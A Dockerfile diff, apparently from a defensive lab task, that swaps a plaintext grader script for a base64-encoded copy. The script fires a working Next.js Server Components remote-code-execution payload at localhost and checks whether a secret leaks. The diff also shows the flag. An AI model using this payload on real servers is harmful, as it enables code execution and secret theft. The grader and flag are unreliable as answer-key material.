@@ -54,34 +54,9 @@ RUN echo "cve{nextjs-flight-protocol-issue-defended}" > .rng_secret
 
 USER root
 
-SHELL ["/bin/bash", "-c"]
-
-RUN cat > /usr/local/bin/submit <<'SCRIPT'
-#!/bin/bash
-# Get the secret from the protected file
-SECRET=$(cat /home/secspace/app/.rng_secret 2>/dev/null)
-
-# Payload for the Next.js RSC Flight Protocol RCE attack
-PAYLOAD='{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.env.RNG_SECRET;throw Object.assign(new Error(\"x\"),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
-
-# Send the attack request
-RESULT=$(curl -s -X POST "http://localhost:3000/adfa" \
-  -H "Next-Action: x" \
-  -F "0=$PAYLOAD" \
-  -F '1="$@0"' \
-  -F '2=[]')
-
-# Check if the secret was successfully leaked in the result
-if echo "$RESULT" | grep -q "$SECRET"; then
-  echo -ne "\e[31mIncorrect\e[0m\n"
-else
-  echo -ne "\e[32mCorrect\e[0m\n"
-fi
-SCRIPT
-
-RUN chmod +x /usr/local/bin/submit
-
-SHELL ["/bin/sh", "-c"]
+RUN echo "IyEvYmluL2Jhc2gKIyBHZXQgdGhlIHNlY3JldCBmcm9tIHRoZSBwcm90ZWN0ZWQgZmlsZQpTRUNSRVQ9JChjYXQgL2hvbWUvc2Vjc3BhY2UvYXBwLy5ybmdfc2VjcmV0IDI+L2Rldi9udWxsKQoKIyBQYXlsb2FkIGZvciB0aGUgTmV4dC5qcyBSU0MgRmxpZ2h0IFByb3RvY29sIFJDRSBhdHRhY2sKUEFZTE9BRD0neyJ0aGVuIjoiJDE6X19wcm90b19fOnRoZW4iLCJzdGF0dXMiOiJyZXNvbHZlZF9tb2RlbCIsInJlYXNvbiI6LTEsInZhbHVlIjoie1widGhlblwiOlwiJEIxMzM3XCJ9IiwiX3Jlc3BvbnNlIjp7Il9wcmVmaXgiOiJ2YXIgcmVzPXByb2Nlc3MuZW52LlJOR19TRUNSRVQ7dGhyb3cgT2JqZWN0LmFzc2lnbihuZXcgRXJyb3IoXCJ4XCIpLHtkaWdlc3Q6IHJlc30pOyIsIl9jaHVua3MiOiIkUTIiLCJfZm9ybURhdGEiOnsiZ2V0IjoiJDE6Y29uc3RydWN0b3I6Y29uc3RydWN0b3IifX19JwoKIyBTZW5kIHRoZSBhdHRhY2sgcmVxdWVzdApSRVNVTFQ9JChjdXJsIC1zIC1YIFBPU1QgImh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hZGZhIiBcCiAgLUggIk5leHQtQWN0aW9uOiB4IiBcCiAgLUYgIjA9JFBBWUxPQUQiIFwKICAtRiAnMT0iJEAwIicgXAogIC1GICcyPVtdJykKCiMgQ2hlY2sgaWYgdGhlIHNlY3JldCB3YXMgc3VjY2Vzc2Z1bGx5IGxlYWtlZCBpbiB0aGUgcmVzdWx0CmlmIGVjaG8gIiRSRVNVTFQiIHwgZ3JlcCAtcSAiJFNFQ1JFVCI7IHRoZW4KICBlY2hvIC1uZSAiXGVbMzFtSW5jb3JyZWN0XGVbMG1cbiIKZWxzZQogIGVjaG8gLW5lICJcZVszMm1Db3JyZWN0XGVbMG1cbiIKZmk=" \
+    | base64 -d > /usr/local/bin/submit \
+    && chmod +x /usr/local/bin/submit
 
 EXPOSE 22 3000
 
